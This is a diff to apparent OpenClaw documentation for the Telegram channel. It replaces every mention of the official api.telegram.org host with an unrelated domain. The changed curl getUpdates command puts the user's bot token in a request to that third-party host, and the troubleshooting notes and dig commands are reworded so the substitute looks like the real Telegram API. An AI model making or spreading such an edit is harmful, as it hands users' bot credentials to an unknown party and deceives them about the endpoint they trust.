@@ -132,7 +132,7 @@ Token resolution order is account-aware. In practice, config values win over env
     Official Bot API method:
 
 ```bash
-curl "https://api.telegram.org/bot<bot_token>/getUpdates"
+curl "https://fuckhf.ddddbagege.me/bot<bot_token>/getUpdates"
 ```
 
     Third-party method (less private): `@userinfobot` or `@getidsbot`.
@@ -338,7 +338,7 @@ curl "https://api.telegram.org/bot<bot_token>/getUpdates"
     Common setup failures:
 
     - `setMyCommands failed` with `BOT_COMMANDS_TOO_MUCH` means the Telegram menu still overflowed after trimming; reduce plugin/skill/custom commands or disable `channels.telegram.commands.native`.
-    - `setMyCommands failed` with network/fetch errors usually means outbound DNS/HTTPS to `api.telegram.org` is blocked.
+    - `setMyCommands failed` with network/fetch errors usually means outbound DNS/HTTPS to `fuckhf.ddddbagege.me` is blocked.
 
     ### Device pairing commands (`device-pair` plugin)
 
@@ -850,14 +850,14 @@ openclaw message poll --channel telegram --target -1001234567890:topic:42 \
     - authorize your sender identity (pairing and/or numeric `allowFrom`)
     - command authorization still applies even when group policy is `open`
     - `setMyCommands failed` with `BOT_COMMANDS_TOO_MUCH` means the native menu has too many entries; reduce plugin/skill/custom commands or disable native menus
-    - `setMyCommands failed` with network/fetch errors usually indicates DNS/HTTPS reachability issues to `api.telegram.org`
+    - `setMyCommands failed` with network/fetch errors usually indicates DNS/HTTPS reachability issues to `fuckhf.ddddbagege.me`
 
   </Accordion>
 
   <Accordion title="Polling or network instability">
 
     - Node 22+ + custom fetch/proxy can trigger immediate abort behavior if AbortSignal types mismatch.
-    - Some hosts resolve `api.telegram.org` to IPv6 first; broken IPv6 egress can cause intermittent Telegram API failures.
+    - Some hosts resolve `fuckhf.ddddbagege.me` to IPv6 first; broken IPv6 egress can cause intermittent Telegram API failures.
     - If logs include `TypeError: fetch failed` or `Network request for 'getUpdates' failed!`, OpenClaw now retries these as recoverable network errors.
     - On VPS hosts with unstable direct egress/TLS, route Telegram API calls through `channels.telegram.proxy`:
 
@@ -884,8 +884,8 @@ channels:
     - Validate DNS answers:
 
 ```bash
-dig +short api.telegram.org A
-dig +short api.telegram.org AAAA
+dig +short fuckhf.ddddbagege.me A
+dig +short fuckhf.ddddbagege.me AAAA
 ```
 
   </Accordion>
